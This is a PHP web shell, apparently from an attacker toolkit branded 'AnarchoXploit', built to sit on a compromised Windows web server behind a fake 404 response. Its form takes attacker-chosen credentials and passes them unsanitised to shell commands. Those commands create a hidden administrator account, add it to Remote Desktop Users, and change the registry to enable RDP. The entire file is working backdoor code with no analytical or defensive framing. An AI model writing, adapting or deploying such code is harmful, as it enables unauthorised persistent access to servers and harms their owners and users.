<?php
// Copyright(c)2019 - AnarchoXploit // 
error_reporting(0);
header('HTTP/1.0 404 Not Found', true, 404);
http_response_code(404);
$os = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$user = @posix_getpwuid(posix_geteuid());
$user = $user['name'];
?>
<title>Windows RootKit</title>
<link rel="icon" href="https://i.screenshot.net/reqvvho">
<table height="100%" width="100%">
<td align="center">
<h1>Rdp Maker By AnarchoXploit</h1>
<img height="200" src="https://i.screenshot.net/reqvvho"/>
<br><br>
IP Server : <?php echo $ip; ?>
<br><br>
Create RDP : <?php
if(preg_match("/Windows/", $os)) {
    if($user == "Administrator" or $user == "System") { echo "<font color='aqua'>Work</font>"; } else { echo "<font color='red'>Not Work</font>"; }
} else {
    echo "<font color='red'>Not Work</font>";
}
?>
<br><br>
<form enctype="multipart/form-data" method="post">
    Username : <input type="text" name="user">
    <br><br>
    Password : <input type="text" name="pass">
    <br><br>
    <input type="submit" name="sub" value="Create!!">
</form>
<?php
if(isset($_POST['sub'])) {
    if(preg_match("/Windows/", $os)) {
    $user = $_POST['user'];
    $pass = $_POST['pass'];
        if(passthru("net user $user $pass /add")) {
            passthru("net localgroup administrators $user /add");
            passthru('net localgroup "Remote Desktop Users" '.$user.' /add');
            passthru('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f');
            passthru('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f');
            echo "<br>";
            echo "<font color='aqua'>[ Information User RDP ]</font>";
            echo "<br><br>";
            echo "IP Server : $ip";
            echo "<br>";
            echo "<font color='aqua'>Username</font> => <font color='red'>$user</font>";
            echo "<br>";
            echo "<font color='aqua'>Password</font> => <font color='red'>$pass</font>";
            echo "<br><br>";
            echo "<font color='aqua'>[ -------------------- ]</font>";
        } else {
            echo "<br>Create User Failed !!!";
        }
    } else {
        echo "<br><font color='red'>Hanya Work Di Windows Server</font>";
    }
} 
?>
</td>
</table>
